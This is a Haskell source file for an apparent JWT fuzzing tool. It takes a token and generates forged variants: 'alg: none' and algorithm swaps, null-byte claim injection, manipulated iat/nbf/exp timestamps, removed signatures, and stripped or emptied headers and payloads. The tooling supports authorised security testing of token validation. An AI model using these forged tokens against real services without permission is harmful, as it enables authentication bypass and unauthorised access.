{-# LANGUAGE OverloadedStrings #-}
module Cmd.Fuzz
  (run) where

import           Data.Aeson
import qualified Data.Aeson.KeyMap as KeyMap
import qualified Data.ByteString as BS
import qualified Data.ByteString.UTF8 as BS.UTF8
import           Data.Either
import qualified Data.Text as Text
import           Model.Jwt as Jwt
import           Model.Args
import           Text.Printf

run :: Args -> String -> IO (Either String [Jwt])
run args l = do
  case parseJwt $ BS.UTF8.fromString l of
    Left e -> do
      return . Left $ printf "Failed to Parse provided JWT: %s" e
    Right jwt ->
      return . Right $ concatMap (\fn -> fn jwt) attacks

attacks :: [(Jwt -> [Jwt])]
attacks =
  [ atk_algoNone
  , atk_algoSwap
  , atk_nullInj
  , atk_psychicSig
  , atk_iat
  , atk_notBefore
  , atk_exp
  , atk_removeAlg
  , atk_removeType
  , atk_removeSig
  , atk_emptyHeader
  , atk_emptyPayload
  ]

atk_algoNone :: Jwt -> [Jwt]
atk_algoNone jwt =
  [ Jwt.insertHeader jwt ("alg", "none")
  , Jwt.insertHeader jwt ("alg", "NONE")
  ]

atk_algoSwap :: Jwt -> [Jwt]
atk_algoSwap jwt =
  -- https://datatracker.ietf.org/doc/html/rfc7518#section-3.1
  map (Jwt.upsertAlgo jwt)
    [ "RS256"
    , "RS384"
    , "RS512"
    , "HS256"
    , "HS384"
    , "HS512"
    , "ES256"
    , "ES384"
    , "ES512"
    , "PS256"
    , "PS384"
    , "PS512"
    , "none"
    ]

spray :: Jwt -> String -> [Jwt]
spray jwt payload =
  Jwt.mapClaims
    (\k v ->
      case v of
        Data.Aeson.Object _ ->
          -- What do do here? Not a primitive. TODO: Traverse
          v
        Data.Aeson.Array _ ->
          -- What do do here? Not a primitive. TODO: Traverse
          v
        Data.Aeson.String s ->
          Data.Aeson.String $ Text.pack payload
        Data.Aeson.Number _ ->
          Data.Aeson.String $ Text.pack payload
        Data.Aeson.Bool _ ->
          Data.Aeson.String $ Text.pack payload
        Data.Aeson.Null ->
          Data.Aeson.String $ Text.pack payload
    )
    jwt

sprayInject :: Jwt -> String -> [Jwt]
sprayInject jwt payload =
  Jwt.mapClaims
    (\k v ->
      case v of
        Data.Aeson.Object _ ->
          -- What do do here? Not a primitive.
          v
        Data.Aeson.Array _ ->
          -- What do do here? Not a primitive.
          v
        Data.Aeson.String s ->
          Data.Aeson.String $ s <> Text.pack payload
        Data.Aeson.Number _ ->
          -- What do do here? Convert to String?
          v
        Data.Aeson.Bool _ ->
          -- What do do here? Convert to String?
          v
        Data.Aeson.Null ->
          v
    )
    jwt

atk_nullInj :: Jwt -> [Jwt]
atk_nullInj jwt =
  sprayInject jwt "\0"

atk_psychicSig :: Jwt -> [Jwt]
atk_psychicSig jwt =
  -- TODO: Psychic Signatures
  -- https://github.com/DataDog/security-labs-pocs/tree/main/proof-of-concept-exploits/jwt-null-signature-vulnerable-app
  -- https://neilmadden.blog/2022/04/19/psychic-signatures-in-java/
  []

-- IssuedAt
atk_iat :: Jwt -> [Jwt]
atk_iat jwt =
  [ Jwt.mapBodyClaim jwt "iat"
    (\v -> Data.Aeson.Number $ fromInteger 0)
  , Jwt.mapBodyClaim jwt "iat"
    (\v -> case v of
      Number x -> Number $ x + 1000000
      _        -> Data.Aeson.Number $ fromInteger 0
    )
  ]

-- NotBefore nbf
atk_notBefore :: Jwt -> [Jwt]
atk_notBefore jwt =
  let
    iat = Jwt.getBodyClaim jwt "iat"
  in
  [ Jwt.mapBodyClaim jwt "nbf"
    (\v -> Data.Aeson.Number $ fromInteger 0)
  , Jwt.mapBodyClaim jwt "nbf"
    (\v -> case iat of
      Number x -> iat
      _        -> Data.Aeson.Number $ fromInteger 0
    )
  ]


-- Expiry
atk_exp :: Jwt -> [Jwt]
atk_exp jwt =
  let
    iat = Jwt.getBodyClaim jwt "iat"
  in
  [ Jwt.mapBodyClaim jwt "exp"
    (\v -> Data.Aeson.Number $ fromInteger 0)
  , Jwt.mapBodyClaim jwt "exp"
    (\v -> case iat of
      Number x -> iat
      _        -> Data.Aeson.Number $ fromInteger 0
    )
  ]


atk_removeAlg :: Jwt -> [Jwt]
atk_removeAlg jwt =
  [ Jwt.deleteClaimHead jwt "alg" ]

atk_removeType :: Jwt -> [Jwt]
atk_removeType jwt =
  [ Jwt.deleteClaimHead jwt "typ" ]

atk_removeSig :: Jwt -> [Jwt]
atk_removeSig jwt =
  [ jwt { jwtTail = BS.empty } ]

atk_emptyHeader :: Jwt -> [Jwt]
atk_emptyHeader jwt =
  [ jwt { jwtHead = KeyMap.empty } ]

atk_emptyPayload :: Jwt -> [Jwt]
atk_emptyPayload jwt =
  [ jwt { jwtBody = KeyMap.empty } ]

